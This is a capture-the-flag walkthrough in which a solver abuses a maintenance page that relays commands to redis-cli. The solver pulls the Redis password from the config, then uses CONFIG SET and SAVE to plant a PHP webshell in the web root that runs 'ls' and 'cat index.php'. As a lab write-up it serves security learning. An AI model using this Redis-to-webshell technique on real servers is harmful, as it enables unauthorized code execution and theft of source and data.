(Initial message)
  Can you help me?

  I was playing with my birdie (she's a Green Cheek!) in something called tmux,
  then I did something and it disappeared!

  Can you help me find her? We were so attached!!
  We need your help!!

  The server stopped working, all that's left is the maintenance port.

  To access it, run:

  curl http://localhost/maintenance.php

  We're pretty sure the bug is in the index page. Can you somehow use the
  maintenance page to view the source code for index.php?


(Give the maintenance page a try.)
~$ curl http://localhost/maintenance.php
  ERROR: 'cmd' argument required (use commas to separate commands); eg:
  curl http://localhost/maintenance.php?cmd=help
  curl http://localhost/maintenance.php?cmd=mget,example1


(Try the help command.)
~$ curl http://localhost/maintenance.php?cmd=help
  Running: redis-cli --raw -a '<password censored>' 'help'

  redis-cli 5.0.3
  To get help about Redis commands type:
      "help @<group>" to get a list of commands in <group>
      "help <command>" for help on <command>
      "help <tab>" to get a list of possible help topics
      "quit" to exit

  To set redis-cli preferences:
      ":set hints" enable online hints
      ":set nohints" disable online hints
  Set your preferences in ~/.redisclirc


(Get list of active config variables.)
~$ curl http://localhost/maintenance.php?cmd=config,get,*
  Running: redis-cli --raw -a '<password censored>' 'config' 'get' '*'
  dbfilename
  dump.rdb
  requirepass
  R3disp@ss
  masterauth
  ...


(R3disp@ss looks like a password we can use.)
~$ redis-cli -a R3disp@ss -h localhost
  Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.


(Trying the PHP Webshell by guessing the location of the website path.)
localhost:6379> config set dir /var/www/html
localhost:6379> config set dbfilename redis.php
localhost:6379> set test "<?php echo 'CMD:'. system('ls -al');?>"
localhost:6379> save
localhost:6379> exit
~$ curl http://localhost/redis.php --output - > test.txt
~$ head test.txt

(The breakdown of commands.)
  save: forces everything to be saved to the dumpfile, this include the key values.
  set test: sets the value of the key named test.
  config set dbfilename: sets the name of the dumpfile.
  config set dir: sets the location where the dumpfile will be created.


(This puting the php code to run ls in a file accessible by curl.)
(Since index.php is in the same website path, we can just cat the content of it.)
(Leave in the ls -al command because it's easy to spot it.)
~$ redis-cli -a R3disp@ss -h localhost
localhost:6379> set test "<?php echo 'CMD:'. system('ls -al;cat index.php');?>"
localhost:6379> save
localhost:6379> exit
~$ curl http://localhost/redis.php --output - > test.txt
~$ head test.txt -100
